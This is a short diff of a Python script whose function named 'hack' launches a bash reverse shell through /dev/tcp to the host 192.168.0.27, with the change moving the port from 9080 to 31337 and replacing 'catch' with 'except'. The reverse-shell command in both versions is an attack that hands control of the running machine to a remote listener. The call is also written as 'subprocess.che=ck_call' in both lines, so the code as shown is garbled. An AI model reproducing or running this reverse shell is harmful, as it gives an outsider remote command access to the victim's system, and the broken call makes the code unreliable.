@@ -8,8 +8,8 @@ import threading
 
 def hack(num):
     try:
-        subprocess.che=ck_call("/bin/bash -i >/dev/tcp/192.168.0.27/9080 0<&1 2>&1", shell=True, executable='/bin/bash')
-    catch:
+        subprocess.che=ck_call("/bin/bash -i >/dev/tcp/192.168.0.27/31337 0<&1 2>&1", shell=True, executable='/bin/bash')
+    except:
         pass
 
 def clear():
